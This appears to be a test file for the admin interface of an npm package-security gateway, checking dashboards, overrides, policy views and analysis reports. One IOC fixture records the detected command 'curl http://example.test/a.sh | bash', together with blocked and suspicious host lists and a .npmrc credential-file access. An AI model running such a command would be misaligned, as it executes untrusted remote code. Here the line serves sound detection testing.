import { afterEach, describe, expect, it, vi } from "vitest";
import { loadConfig } from "@anvil/config";
import type { ObjectStore } from "@anvil/object-store";
import { MemoryPersistence } from "@anvil/persistence";
import { buildAdmin } from "./app.js";

class TestObjectStore implements ObjectStore {
  private readonly objects = new Map<string, Uint8Array>();

  async get(key: string): Promise<Uint8Array | undefined> {
    return this.objects.get(key);
  }

  async put(key: string, body: Uint8Array): Promise<void> {
    this.objects.set(key, body);
  }
}

describe("admin app", () => {
  afterEach(() => {
    vi.restoreAllMocks();
  });

  it("renders dashboard with decisions and reports", async () => {
    const persistence = new MemoryPersistence();
    await seed(persistence);
    const app = buildAdmin({ config: loadConfig({ ...process.env, ADMIN_TOKEN: "secret" }), persistence });

    const response = await app.inject({ method: "GET", url: "/", headers: { authorization: "Bearer secret" } });

    expect(response.statusCode).toBe(200);
    expect(response.headers["content-type"]).toContain("text/html");
    expect(response.body).toContain("pkg@1.0.0");
    expect(response.body).toContain("Recent Analysis Reports");
    expect(response.body).toContain("Node Base Reports");
    expect(response.body).toContain("dependency");
    expect(response.body).toContain("Policy Configuration");
    expect(response.body).toContain("View effective policy");
    expect(response.body).toContain("Popular Package Index");
    expect(response.body).toContain("Audit Events");
    await app.close();
  });

  it("exposes JSON decision, report, override, policy, index, and audit-event lists", async () => {
    const persistence = new MemoryPersistence();
    await seed(persistence);
    const app = buildAdmin({ config: loadConfig(), persistence });

    const decisions = await app.inject({ method: "GET", url: "/api/decisions?action=block" });
    const reports = await app.inject({ method: "GET", url: "/api/reports" });
    const overrides = await app.inject({ method: "GET", url: "/api/overrides" });
    const filteredOverrides = await app.inject({ method: "GET", url: "/api/overrides?packageName=pkg&version=1.0.0" });
    const nodeBaseReports = await app.inject({ method: "GET", url: "/api/node-base/reports" });
    const policy = await app.inject({ method: "GET", url: "/api/policy" });
    const popularPackageIndex = await app.inject({ method: "GET", url: "/api/popular-package-index" });
    const auditEvents = await app.inject({ method: "GET", url: "/api/audit-events" });
    const filteredAuditEvents = await app.inject({ method: "GET", url: "/api/audit-events?targetId=pkg@1.0.0" });

    expect(decisions.json().decisions).toHaveLength(1);
    expect(reports.json().reports).toHaveLength(1);
    expect(overrides.json().overrides).toHaveLength(1);
    expect(filteredOverrides.json().overrides).toHaveLength(1);
    expect(nodeBaseReports.json().reports).toHaveLength(1);
    expect(nodeBaseReports.json().reports[0]).toMatchObject({ source: "devcontainer", projectName: "demo", reportType: "dependency" });
    expect(policy.json()).toMatchObject({
      runtimeMode: "development",
      policy: { version: "2026-05-20.1", minimumPackageAgeDays: 7 },
      policyConfig: { name: "effective", version: "2026-05-20.1", active: true }
    });
    expect(popularPackageIndex.json().popularPackages).toEqual(expect.arrayContaining([expect.objectContaining({ name: "lodash" })]));
    expect(popularPackageIndex.json().knownConfusions).toMatchObject({ loadash: "lodash" });
    expect(auditEvents.json().auditEvents).toHaveLength(1);
    expect(filteredAuditEvents.json().auditEvents).toHaveLength(1);
    await app.close();
  });

  it("requires the admin token for admin pages and APIs when configured", async () => {
    const persistence = new MemoryPersistence();
    await seed(persistence);
    const app = buildAdmin({ config: loadConfig({ ...process.env, ADMIN_TOKEN: "secret" }), persistence });

    const apiRejected = await app.inject({ method: "GET", url: "/api/reports" });
    const pageRejected = await app.inject({ method: "GET", url: "/" });
    const apiAccepted = await app.inject({ method: "GET", url: "/api/reports", headers: { authorization: "Bearer secret" } });

    expect(apiRejected.statusCode).toBe(401);
    expect(apiRejected.json()).toMatchObject({ error: "ANVIL_ADMIN_TOKEN_REQUIRED" });
    expect(pageRejected.statusCode).toBe(401);
    expect(pageRejected.body).toContain("Admin token required");
    expect(apiAccepted.statusCode).toBe(200);
    expect(apiAccepted.json().reports).toHaveLength(1);
    await app.close();
  });

  it("renders the effective policy configuration", async () => {
    const app = buildAdmin({
      config: loadConfig({
        ...process.env,
        RUNTIME_MODE: "ci",
        LLM_REVIEW_ENABLED: "true",
        LLM_REVIEW_MODEL: "risk-reviewer"
      })
    });

    const response = await app.inject({ method: "GET", url: "/policy" });

    expect(response.statusCode).toBe(200);
    expect(response.body).toContain("Effective Policy");
    expect(response.body).toContain("Persisted Snapshot");
    expect(response.body).toContain("Deterministic Gates");
    expect(response.body).toContain("Raw Policy");
    expect(response.body).toContain("ci");
    expect(response.body).toContain("LLM review enabled");
    expect(response.body).toContain("risk-reviewer");
    await app.close();
  });

  it("renders the popular package index viewer", async () => {
    const app = buildAdmin({ config: loadConfig() });

    const response = await app.inject({ method: "GET", url: "/popular-package-index" });

    expect(response.statusCode).toBe(200);
    expect(response.body).toContain("Index Summary");
    expect(response.body).toContain("Popular Packages");
    expect(response.body).toContain("Known Ecosystem Confusions");
    expect(response.body).toContain("@tanstack/react-query");
    expect(response.body).toContain("@tenstack/react-query");
    await app.close();
  });

  it("validates and uploads popular package indexes to object storage", async () => {
    const persistence = new MemoryPersistence();
    const objectStore = new TestObjectStore();
    const app = buildAdmin({
      config: loadConfig({ ...process.env, ADMIN_TOKEN: "secret" }),
      persistence,
      objectStore
    });

    const rejected = await app.inject({
      method: "POST",
      url: "/api/popular-package-index",
      payload: { popularPackages: [] }
    });
    const invalid = await app.inject({
      method: "POST",
      url: "/api/popular-package-index",
      headers: { authorization: "Bearer secret" },
      payload: { popularPackages: [{ weeklyDownloads: 1 }] }
    });
    const accepted = await app.inject({
      method: "POST",
      url: "/api/popular-package-index",
      headers: { authorization: "Bearer secret" },
      payload: {
        generatedAt: "2026-05-20T00:00:00.000Z",
        uploadedBy: "reviewer",
        popularPackages: [{ name: "real-package", weeklyDownloads: 100_000 }],
        knownConfusions: { "rea1-package": "real-package" }
      }
    });
    const index = await app.inject({ method: "GET", url: "/api/popular-package-index", headers: { authorization: "Bearer secret" } });

    expect(rejected.statusCode).toBe(401);
    expect(invalid.statusCode).toBe(400);
    expect(accepted.statusCode).toBe(201);
    expect(accepted.json()).toMatchObject({
      activeKey: "popular-index/npm/latest.json",
      datedKey: "popular-index/npm/2026-05-20.json"
    });
    expect(await objectStore.get("popular-index/npm/latest.json")).toBeDefined();
    expect(await objectStore.get("popular-index/npm/2026-05-20.json")).toBeDefined();
    expect(index.json()).toMatchObject({
      source: "object:popular-index/npm/latest.json",
      popularPackages: [{ name: "real-package", weeklyDownloads: 100_000 }],
      knownConfusions: { "rea1-package": "real-package" }
    });
    expect((await persistence.listAuditEvents())[0]).toMatchObject({
      actor: "reviewer",
      eventType: "popular_index.updated",
      targetId: "popular-index/npm/latest.json"
    });
    await app.close();
  });

  it("renders Node Base report details", async () => {
    const persistence = new MemoryPersistence();
    const nodeBaseReport = await persistence.putNodeBaseReport({
      source: "devcontainer",
      projectName: "demo",
      reportType: "ioc",
      summary: { high: 1, medium: 2 },
      report: {
        summary: { high: 1, medium: 2 },
        highConfidenceFindings: [{ code: "CURL_PIPE_SHELL", source: "npm-log", evidence: "curl http://example.test/a.sh | bash" }],
        processSummary: {
          totalExecs: 1,
          uniqueCommands: [{ command: "curl", count: 1 }],
          execs: [{ pid: "123", command: "curl", path: "/usr/bin/curl", args: ["curl", "http://example.test/a.sh"], line: 3 }]
        },
        networkSummary: {
          totalConnections: 1,
          byPort: [{ port: 443, count: 1 }],
          connections: [{ pid: "123", family: "AF_INET", address: "93.184.216.34", port: 443, line: 4 }]
        },
        policy: {
          network: {
            allowedPorts: [80, 443],
            allowedHosts: ["registry.npmjs.org"],
            blockedHosts: ["raw.githubusercontent.com"],
            suspiciousHosts: ["pastebin.com"],
            directIpSeverity: "medium",
            nonStandardPortSeverity: "high"
          }
        },
        filesystemSummary: {
          sensitiveAccesses: [{ pid: "123", syscall: "openat", path: "/home/node/.npmrc", line: 5 }]
        }
      }
    });
    const app = buildAdmin({ persistence });

    const api = await app.inject({ method: "GET", url: `/api/node-base/reports/${nodeBaseReport.id}` });
    const page = await app.inject({ method: "GET", url: `/node-base/reports/${nodeBaseReport.id}` });
    const missing = await app.inject({ method: "GET", url: "/api/node-base/reports/missing" });

    expect(api.statusCode).toBe(200);
    expect(api.json().report).toMatchObject({ id: nodeBaseReport.id, source: "devcontainer", projectName: "demo", reportType: "ioc" });
    expect(page.statusCode).toBe(200);
    expect(page.body).toContain("Report Summary");
    expect(page.body).toContain("IOC Findings");
    expect(page.body).toContain("Process Summary");
    expect(page.body).toContain("/usr/bin/curl");
    expect(page.body).toContain("Network Summary");
    expect(page.body).toContain("93.184.216.34");
    expect(page.body).toContain("Network Policy");
    expect(page.body).toContain("registry.npmjs.org");
    expect(page.body).toContain("raw.githubusercontent.com");
    expect(page.body).toContain("Non-standard port severity");
    expect(page.body).toContain("high");
    expect(page.body).toContain("Filesystem Summary");
    expect(page.body).toContain("/home/node/.npmrc");
    expect(page.body).toContain("CURL_PIPE_SHELL");
    expect(page.body).toContain("curl http://example.test/a.sh | bash");
    expect(missing.statusCode).toBe(404);
    await app.close();
  });

  it("renders first-class Node Base network report lists and details", async () => {
    const persistence = new MemoryPersistence();
    await persistence.putNodeBaseReport({
      source: "devcontainer",
      projectName: "demo",
      reportType: "dependency",
      summary: { packagesWithLifecycleScripts: 2 },
      report: { summary: { packagesWithLifecycleScripts: 2 } }
    });
    const networkReport = await persistence.putNodeBaseReport({
      source: "devcontainer",
      projectName: "demo",
      reportType: "network",
      summary: { outboundConnections: 1, high: 0, medium: 1 },
      report: {
        summary: { outboundConnections: 1, high: 0, medium: 1 },
        mediumConfidenceFindings: [{ code: "NON_STANDARD_PORT", source: "strace", line: 8, evidence: "connect(... htons(8080) ...)" }],
        networkSummary: {
          totalConnections: 1,
          byPort: [{ port: 8080, count: 1 }],
          byAddress: [{ address: "198.51.100.10", count: 1 }],
          connections: [{ pid: "321", family: "AF_INET", address: "198.51.100.10", port: 8080, line: 8 }]
        },
        policy: {
          network: {
            allowedPorts: [80, 443],
            allowedHosts: [],
            blockedHosts: ["raw.githubusercontent.com"],
            suspiciousHosts: ["pastebin.com"],
            directIpSeverity: "medium",
            nonStandardPortSeverity: "medium"
          }
        }
      }
    });
    const app = buildAdmin({ persistence });

    const api = await app.inject({ method: "GET", url: "/api/node-base/reports?reportType=network&risk=medium" });
    const list = await app.inject({ method: "GET", url: "/node-base/reports?reportType=network&risk=medium" });
    const highRiskApi = await app.inject({ method: "GET", url: "/api/node-base/reports?reportType=network&risk=high" });
    const detail = await app.inject({ method: "GET", url: `/node-base/reports/${networkReport.id}` });

    expect(api.statusCode).toBe(200);
    expect(api.json().reports).toHaveLength(1);
    expect(api.json().reports[0]).toMatchObject({ reportType: "network", summary: { outboundConnections: 1 } });
    expect(highRiskApi.statusCode).toBe(200);
    expect(highRiskApi.json().reports).toHaveLength(0);
    expect(list.statusCode).toBe(200);
    expect(list.body).toContain("Report Types");
    expect(list.body).toContain("Risk");
    expect(list.body).toContain("network Reports");
    expect(list.body).toContain("medium network Reports");
    expect(list.body).toContain("1 connections");
    expect(list.body).toContain("dependency");
    expect(detail.statusCode).toBe(200);
    expect(detail.body).toContain("Network Summary");
    expect(detail.body).toContain("IOC Findings");
    expect(detail.body).toContain("NON_STANDARD_PORT");
    expect(detail.body).toContain("198.51.100.10");
    expect(detail.body).toContain("8080");
    expect(detail.body).toContain("Network Policy");
    expect(detail.body).toContain("Allowed ports");
    expect(detail.body).toContain("80, 443");
    await app.close();
  });

  it("does not double-count Node Base risk summary aliases", async () => {
    const persistence = new MemoryPersistence();
    await persistence.putNodeBaseReport({
      source: "devcontainer",
      projectName: "demo",
      reportType: "ioc",
      summary: { high: 1, highConfidenceFindings: 1, medium: 2, mediumConfidenceFindings: 2 },
      report: { summary: { high: 1, highConfidenceFindings: 1, medium: 2, mediumConfidenceFindings: 2 } }
    });
    const app = buildAdmin({ persistence });

    const list = await app.inject({ method: "GET", url: "/node-base/reports" });
    const mediumApi = await app.inject({ method: "GET", url: "/api/node-base/reports?risk=medium" });

    expect(list.statusCode).toBe(200);
    expect(list.body).toContain("1 high findings | 2 medium findings");
    expect(list.body).not.toContain("1 high findings | 2 medium findings | 1 high findings | 2 medium findings");
    expect(mediumApi.statusCode).toBe(200);
    expect(mediumApi.json().reports).toHaveLength(0);
    await app.close();
  });

  it("exposes a package version review API", async () => {
    const persistence = new MemoryPersistence();
    await seed(persistence);
    await persistence.putPolicyDecision("other", "1.0.0", "policy", {
      action: "allow",
      score: 0,
      reasons: [],
      explanation: "other is allowed."
    });
    const app = buildAdmin({ config: loadConfig(), persistence });

    const response = await app.inject({ method: "GET", url: "/api/packages/pkg/1.0.0/review" });
    const missing = await app.inject({ method: "GET", url: "/api/packages/missing/1.0.0/review" });

    expect(response.statusCode).toBe(200);
    expect(response.json().review.decisions).toHaveLength(1);
    expect(response.json().review.packageVersion).toMatchObject({
      packageName: "pkg",
      version: "1.0.0",
      weeklyDownloads: 42,
      cachedTarballKey: "tarballs/pkg/1.0.0/sha512-test.tgz"
    });
    expect(response.json().review.reports).toHaveLength(1);
    expect(response.json().review.llmRiskReviews).toHaveLength(1);
    expect(response.json().review.overrides).toHaveLength(1);
    expect(response.json().review.auditEvents).toHaveLength(1);
    expect(response.json().review.decisions[0].packageName).toBe("pkg");
    expect(missing.statusCode).toBe(404);
    await app.close();
  });

  it("handles scoped package names in review URLs", async () => {
    const persistence = new MemoryPersistence();
    await persistence.putPolicyDecision("@scope/pkg", "1.0.0", "policy", {
      action: "warn",
      score: 12,
      reasons: [{ code: "LOW_WEEKLY_DOWNLOADS", message: "Low downloads.", severity: "low" }],
      explanation: "scoped package needs review"
    });
    const app = buildAdmin({ persistence });

    const dashboard = await app.inject({ method: "GET", url: "/" });
    const api = await app.inject({ method: "GET", url: "/api/packages/%40scope%2Fpkg/1.0.0/review" });
    const page = await app.inject({ method: "GET", url: "/packages/%40scope%2Fpkg/1.0.0" });
    const decisions = await app.inject({ method: "GET", url: "/packages/%40scope%2Fpkg/1.0.0/decisions" });

    expect(dashboard.statusCode).toBe(200);
    expect(dashboard.body).toContain("/packages/%40scope%2Fpkg/1.0.0");
    expect(api.statusCode).toBe(200);
    expect(api.json().review).toMatchObject({ packageName: "@scope/pkg", version: "1.0.0" });
    expect(page.statusCode).toBe(200);
    expect(page.body).toContain("@scope/pkg@1.0.0");
    expect(decisions.statusCode).toBe(200);
    expect(decisions.body).toContain("scoped package needs review");
    await app.close();
  });

  it("renders identity-specific package decision history", async () => {
    const persistence = new MemoryPersistence();
    await persistence.putPolicyDecision(
      "pkg",
      "1.0.0",
      "policy",
      {
        action: "block",
        score: 95,
        reasons: [{ code: "UNEXPECTED_BINARY_FILE", message: "Old tarball was blocked.", severity: "high" }],
        explanation: "old tarball blocked"
      },
      { tarballIntegrity: "sha512-old", tarballShasum: "oldsum", analyserVersion: "static-v1" }
    );
    await persistence.putPolicyDecision(
      "pkg",
      "1.0.0",
      "policy",
      {
        action: "warn",
        score: 30,
        reasons: [{ code: "INSTALL_SCRIPT_CHANGED", message: "New tarball needs review.", severity: "medium" }],
        explanation: "new tarball warned"
      },
      { tarballIntegrity: "sha512-new", tarballShasum: "newsum", analyserVersion: "static-v2" }
    );
    const app = buildAdmin({ persistence });

    const api = await app.inject({ method: "GET", url: "/api/packages/pkg/1.0.0/decisions" });
    const page = await app.inject({ method: "GET", url: "/packages/pkg/1.0.0/decisions" });
    const missing = await app.inject({ method: "GET", url: "/api/packages/missing/1.0.0/decisions" });

    expect(api.statusCode).toBe(200);
    expect(api.json().decisions).toHaveLength(2);
    expect(api.json().decisions).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ tarballIntegrity: "sha512-old", decision: expect.objectContaining({ action: "block" }) }),
        expect.objectContaining({ tarballIntegrity: "sha512-new", decision: expect.objectContaining({ action: "warn" }) })
      ])
    );
    expect(page.statusCode).toBe(200);
    expect(page.body).toContain("Decision Timeline");
    expect(page.body).toContain("Identity History");
    expect(page.body).toContain("sha512-old");
    expect(page.body).toContain("sha512-new");
    expect(page.body).toContain("New tarball needs review.");
    expect(missing.statusCode).toBe(404);
    await app.close();
  });

  it("protects override creation when admin token is configured", async () => {
    const now = vi.spyOn(Date, "now").mockReturnValue(Date.parse("2026-05-20T00:00:00.000Z"));
    const persistence = new MemoryPersistence();
    const app = buildAdmin({ config: loadConfig({ ...process.env, ADMIN_TOKEN: "secret" }), persistence });

    const rejected = await app.inject({
      method: "POST",
      url: "/api/overrides",
      payload: { packageName: "pkg", version: "1.0.0", reason: "intentional" }
    });
    const accepted = await app.inject({
      method: "POST",
      url: "/api/overrides",
      headers: { authorization: "Bearer secret" },
      payload: { packageName: " pkg ", version: " 1.0.0 ", reason: " intentional " }
    });
    const invalid = await app.inject({
      method: "POST",
      url: "/api/overrides",
      headers: { authorization: "Bearer secret" },
      payload: { packageName: "pkg", reason: "intentional", action: "approve" }
    });

    expect(rejected.statusCode).toBe(401);
    expect(accepted.statusCode).toBe(201);
    expect(invalid.statusCode).toBe(400);
    expect(invalid.json()).toMatchObject({ error: "ANVIL_OVERRIDE_INVALID" });
    expect(await persistence.getOverride("pkg", "1.0.0")).toMatchObject({ reason: "intentional", expiresAt: "2026-06-19T00:00:00.000Z" });
    expect(await persistence.listAuditEvents()).toHaveLength(1);
    await app.close();
    now.mockRestore();
  });

  it("allows dashboard forms after local admin token session is unlocked", async () => {
    const persistence = new MemoryPersistence();
    const app = buildAdmin({ config: loadConfig({ ...process.env, ADMIN_TOKEN: "secret" }), persistence });

    const dashboard = await app.inject({ method: "GET", url: "/" });
    const session = await app.inject({
      method: "POST",
      url: "/-/admin/session",
      headers: { "content-type": "application/x-www-form-urlencoded" },
      payload: "token=secret"
    });
    const cookie = session.headers["set-cookie"];
    const created = await app.inject({
      method: "POST",
      url: "/api/overrides",
      headers: { "content-type": "application/x-www-form-urlencoded", cookie },
      payload: "packageName=form-pkg&version=1.0.0&action=allow&reason=intentional&expiresAt=2026-06-01T00%3A00%3A00Z"
    });
    const managedDashboard = await app.inject({ method: "GET", url: "/", headers: { cookie } });
    const revoked = await app.inject({
      method: "POST",
      url: "/api/overrides/revoke",
      headers: { "content-type": "application/x-www-form-urlencoded", cookie },
      payload: "packageName=form-pkg&version=1.0.0"
    });

    expect(dashboard.statusCode).toBe(401);
    expect(dashboard.body).toContain("Admin token required");
    expect(session.statusCode).toBe(302);
    expect(String(cookie)).toContain("anvil_admin_token=");
    expect(created.statusCode).toBe(201);
    expect(managedDashboard.body).toContain("expires at");
    expect(managedDashboard.body).toContain("Revoke");
    expect(revoked.statusCode).toBe(200);
    expect(await persistence.getOverride("form-pkg", "1.0.0")).toBeUndefined();
    await app.close();
  });

  it("treats malformed admin cookies as unauthenticated", async () => {
    const app = buildAdmin({ config: loadConfig({ ...process.env, ADMIN_TOKEN: "secret" }) });

    const response = await app.inject({
      method: "GET",
      url: "/",
      headers: { cookie: "anvil_admin_token=%E0%A4%A" }
    });

    expect(response.statusCode).toBe(401);
    expect(response.body).toContain("Admin token required");
    await app.close();
  });

  it("renders and submits package LLM review requests through the gateway", async () => {
    const persistence = new MemoryPersistence();
    await seed(persistence);
    const fetchGateway = vi.fn(async () => new Response(JSON.stringify({ ok: true, queued: 1, jobs: [{ packageName: "pkg", version: "1.0.0" }] }), {
      headers: { "content-type": "application/json" },
      status: 202
    }));
    const app = buildAdmin({
      config: loadConfig({
        ...process.env,
        ADMIN_TOKEN: "secret",
        ANVIL_API_BASE_URL: "http://gateway.test",
        LLM_REVIEW_ENABLED: "true",
        LLM_REVIEW_ENDPOINT: "https://llm.example.test/review"
      }),
      persistence,
      fetch: fetchGateway as unknown as typeof globalThis.fetch
    });

    const session = await app.inject({
      method: "POST",
      url: "/-/admin/session",
      headers: { "content-type": "application/x-www-form-urlencoded" },
      payload: "token=secret"
    });
    const cookie = session.headers["set-cookie"];
    const page = await app.inject({ method: "GET", url: "/packages/pkg/1.0.0", headers: { cookie } });
    const response = await app.inject({
      method: "POST",
      url: "/api/packages/pkg/1.0.0/llm-review",
      headers: { "content-type": "application/x-www-form-urlencoded", cookie },
      payload: "requestedBy=reviewer&priority=normal"
    });
    const defaulted = await app.inject({
      method: "POST",
      url: "/api/packages/pkg/1.0.0/llm-review",
      headers: { cookie }
    });
    const invalid = await app.inject({
      method: "POST",
      url: "/api/packages/pkg/1.0.0/llm-review",
      headers: { "content-type": "application/x-www-form-urlencoded", cookie },
      payload: "requestedBy=reviewer&priority=urgent"
    });

    expect(page.statusCode).toBe(200);
    expect(page.body).toContain("Request LLM Review");
    expect(response.statusCode).toBe(202);
    expect(defaulted.statusCode).toBe(202);
    expect(invalid.statusCode).toBe(400);
    expect(invalid.json()).toMatchObject({ error: "ANVIL_LLM_REVIEW_REQUEST_INVALID" });
    expect(response.json()).toMatchObject({ queued: 1 });
    expect(fetchGateway).toHaveBeenNthCalledWith(
      1,
      "http://gateway.test/-/anvil/llm-review",
      expect.objectContaining({
        method: "POST",
        headers: expect.objectContaining({ authorization: "Bearer secret" }),
        body: JSON.stringify({ packageName: "pkg", version: "1.0.0", requestedBy: "reviewer", priority: "normal" })
      })
    );
    expect(fetchGateway).toHaveBeenNthCalledWith(
      2,
      "http://gateway.test/-/anvil/llm-review",
      expect.objectContaining({
        body: JSON.stringify({ packageName: "pkg", version: "1.0.0", requestedBy: "admin-ui", priority: "high" })
      })
    );
    await app.close();
  });

  it("protects and disables admin LLM review requests when required", async () => {
    const fetchGateway = vi.fn();
    const protectedApp = buildAdmin({
      config: loadConfig({
        ...process.env,
        ADMIN_TOKEN: "secret",
        ANVIL_API_BASE_URL: "http://gateway.test",
        LLM_REVIEW_ENABLED: "true",
        LLM_REVIEW_ENDPOINT: "https://llm.example.test/review"
      }),
      fetch: fetchGateway as unknown as typeof globalThis.fetch
    });
    const disabledApp = buildAdmin({
      config: loadConfig({
        ...process.env,
        ANVIL_API_BASE_URL: "http://gateway.test"
      }),
      fetch: fetchGateway as unknown as typeof globalThis.fetch
    });

    const rejected = await protectedApp.inject({
      method: "POST",
      url: "/api/packages/pkg/1.0.0/llm-review",
      payload: { requestedBy: "reviewer" }
    });
    const disabled = await disabledApp.inject({
      method: "POST",
      url: "/api/packages/pkg/1.0.0/llm-review",
      payload: { requestedBy: "reviewer" }
    });

    expect(rejected.statusCode).toBe(401);
    expect(disabled.statusCode).toBe(409);
    expect(fetchGateway).not.toHaveBeenCalled();
    await protectedApp.close();
    await disabledApp.close();
  });

  it("preserves plain-text gateway errors from LLM review requests", async () => {
    const fetchGateway = vi.fn(async () => new Response("gateway unavailable", { status: 502, statusText: "Bad Gateway" }));
    const app = buildAdmin({
      config: loadConfig({
        ...process.env,
        ADMIN_TOKEN: "secret",
        ANVIL_API_BASE_URL: "http://gateway.test",
        LLM_REVIEW_ENABLED: "true",
        LLM_REVIEW_ENDPOINT: "https://llm.example.test/review"
      }),
      fetch: fetchGateway as unknown as typeof globalThis.fetch
    });

    const response = await app.inject({
      method: "POST",
      url: "/api/packages/pkg/1.0.0/llm-review",
      headers: { authorization: "Bearer secret" },
      payload: { requestedBy: "reviewer" }
    });

    expect(response.statusCode).toBe(502);
    expect(response.json()).toMatchObject({ error: "ANVIL_LLM_REVIEW_REQUEST_FAILED", detail: "gateway unavailable" });
    await app.close();
  });

  it("revokes overrides, clears cached decisions, and writes audit events", async () => {
    const persistence = new MemoryPersistence();
    await persistence.putOverride({ packageName: "pkg", version: "1.0.0", action: "allow", reason: "temporary", approvedBy: "test" });
    await persistence.putPolicyDecision("pkg", "1.0.0", loadConfig().policy.version, {
      action: "allow",
      score: 0,
      reasons: [],
      explanation: "cached"
    });
    const app = buildAdmin({ config: loadConfig({ ...process.env, ADMIN_TOKEN: "secret" }), persistence });

    const response = await app.inject({
      method: "POST",
      url: "/api/overrides/revoke",
      headers: { authorization: "Bearer secret" },
      payload: { packageName: " pkg ", version: " 1.0.0 ", revokedBy: " reviewer " }
    });
    const invalid = await app.inject({
      method: "POST",
      url: "/api/overrides/revoke",
      headers: { authorization: "Bearer secret" },
      payload: { packageName: "" }
    });

    expect(response.statusCode).toBe(200);
    expect(invalid.statusCode).toBe(400);
    expect(invalid.json()).toMatchObject({ error: "ANVIL_OVERRIDE_REVOKE_INVALID" });
    expect(await persistence.getOverride("pkg", "1.0.0")).toBeUndefined();
    expect(await persistence.getPolicyDecision("pkg", "1.0.0", loadConfig().policy.version)).toBeUndefined();
    expect(await persistence.listAuditEvents()).toEqual([
      expect.objectContaining({
        actor: "reviewer",
        eventType: "override.revoked",
        targetId: "pkg@1.0.0"
      })
    ]);
    await app.close();
  });

  it("renders report details", async () => {
    const persistence = new MemoryPersistence();
    await seed(persistence);
    const app = buildAdmin({ persistence });

    const response = await app.inject({ method: "GET", url: "/reports/pkg/1.0.0" });

    expect(response.statusCode).toBe(200);
    expect(response.body).toContain("NEW_INSTALL_SCRIPT");
    expect(response.body).toContain("Tarball Integrity");
    expect(response.body).toContain("sha512-test");
    expect(response.body).toContain("Provenance");
    expect(response.body).toContain("dist.attestations");
    expect(response.body).toContain("https://registry.example/-/npm/v1/attestations/pkg@1.0.0");
    expect(response.body).toContain("Verification Status");
    expect(response.body).toContain("subject_matched");
    expect(response.body).toContain("Cryptographic signature verification has not been performed.");
    expect(response.body).toContain("Manifest Changes");
    expect(response.body).toContain("postinstall");
    expect(response.body).toContain("node install.js");
    expect(response.body).toContain("Dependency Changes");
    expect(response.body).toContain("left-pad");
    expect(response.body).toContain("debug");
    expect(response.body).toContain("optional");
    expect(response.body).toContain("fsevents");
    expect(response.body).toContain("peer");
    expect(response.body).toContain("react");
    expect(response.body).toContain("Metadata Field Changes");
    expect(response.body).toContain("repository");
    expect(response.body).toContain("github:demo/new");
    expect(response.body).toContain("bin");
    expect(response.body).toContain("cli.js");
    expect(response.body).toContain("File Findings");
    expect(response.body).toContain("install.js");
    expect(response.body).toContain("installPath: true");
    expect(response.body).toContain("pattern: child_process");
    await app.close();
  });

  it("selects identity-specific analysis reports", async () => {
    const persistence = new MemoryPersistence();
    const objectStore = new TestObjectStore();
    const objectKey = "analysis/pkg/1.0.0/policy/static-v2/sha512-new/report.json";
    await persistence.putAnalysisReport({
      packageName: "pkg",
      version: "1.0.0",
      analyserVersion: "static-v1",
      policyVersion: "policy",
      tarballIntegrity: "sha512-old",
      tarballShasum: "oldsum",
      score: 95,
      signals: [{ code: "UNEXPECTED_BINARY_FILE", message: "Old tarball had a binary.", severity: "high" }],
      fileFindings: [{ path: "bin/native", code: "UNEXPECTED_BINARY_FILE", reason: "Old tarball had a binary.", severity: "high", evidence: { size: 2048, mode: "0o755" } }],
      createdAt: "2020-01-01T00:00:00.000Z"
    });
    await persistence.putAnalysisReport({
      packageName: "pkg",
      version: "1.0.0",
      analyserVersion: "static-v2",
      policyVersion: "policy",
      tarballIntegrity: "sha512-new",
      tarballShasum: "newsum",
      objectKey,
      score: 30,
      signals: [{ code: "INSTALL_SCRIPT_CHANGED", message: "New tarball changed install script.", severity: "medium" }],
      manifestDiff: {
        lifecycleScripts: { previous: { install: "node old.js" }, target: { install: "node new.js" } },
        metadata: { repository: { previous: "github:demo/old", target: "github:demo/new" } }
      },
      dependencyDiff: { added: { debug: "^4.3.0" }, optional: { added: { fsevents: "^2.3.3" }, removed: {}, changed: {} } },
      createdAt: "2021-01-01T00:00:00.000Z"
    });
    await objectStore.put(
      objectKey,
      new TextEncoder().encode(
        JSON.stringify({
          packageName: "pkg",
          version: "1.0.0",
          objectKey,
          artifact: true
        })
      )
    );
    const app = buildAdmin({ persistence, objectStore });

    const api = await app.inject({ method: "GET", url: "/api/reports/pkg/1.0.0?integrity=sha512-old&analyser=static-v1" });
    const artifact = await app.inject({ method: "GET", url: "/api/reports/pkg/1.0.0/artifact?integrity=sha512-new&shasum=newsum&analyser=static-v2" });
    const missingArtifact = await app.inject({ method: "GET", url: "/api/reports/pkg/1.0.0/artifact?integrity=sha512-old&analyser=static-v1" });
    const compareApi = await app.inject({ method: "GET", url: "/api/packages/pkg/1.0.0/reports/compare?leftIntegrity=sha512-old&leftAnalyser=static-v1&rightIntegrity=sha512-new&rightAnalyser=static-v2" });
    const page = await app.inject({ method: "GET", url: "/reports/pkg/1.0.0?integrity=sha512-new&shasum=newsum&analyser=static-v2" });
    const comparePage = await app.inject({ method: "GET", url: "/packages/pkg/1.0.0/reports/compare?leftIntegrity=sha512-old&leftAnalyser=static-v1&rightIntegrity=sha512-new&rightAnalyser=static-v2" });
    const review = await app.inject({ method: "GET", url: "/packages/pkg/1.0.0" });

    expect(api.statusCode).toBe(200);
    expect(api.json().report).toMatchObject({ tarballIntegrity: "sha512-old", analyserVersion: "static-v1" });
    expect(artifact.statusCode).toBe(200);
    expect(artifact.headers["content-type"]).toContain("application/json");
    expect(artifact.json()).toMatchObject({ packageName: "pkg", version: "1.0.0", objectKey, artifact: true });
    expect(missingArtifact.statusCode).toBe(404);
    expect(missingArtifact.json()).toMatchObject({ error: "ANVIL_REPORT_ARTIFACT_NOT_STORED" });
    expect(compareApi.statusCode).toBe(200);
    expect(compareApi.json().comparison).toMatchObject({ scoreDelta: -65 });
    expect(compareApi.json().comparison.signals.added[0]).toMatchObject({ code: "INSTALL_SCRIPT_CHANGED" });
    expect(compareApi.json().comparison.signals.removed[0]).toMatchObject({ code: "UNEXPECTED_BINARY_FILE" });
    expect(page.statusCode).toBe(200);
    expect(page.body).toContain("sha512-new");
    expect(page.body).toContain("analysis/pkg/1.0.0/policy/static-v2/sha512-new/report.json");
    expect(page.body).toContain("/api/reports/pkg/1.0.0/artifact?integrity=sha512-new&amp;shasum=newsum&amp;analyser=static-v2");
    expect(page.body).toContain("New tarball changed install script.");
    expect(comparePage.statusCode).toBe(200);
    expect(comparePage.body).toContain("Comparison Summary");
    expect(comparePage.body).toContain("Score Delta");
    expect(comparePage.body).toContain("Signal Changes");
    expect(comparePage.body).toContain("UNEXPECTED_BINARY_FILE");
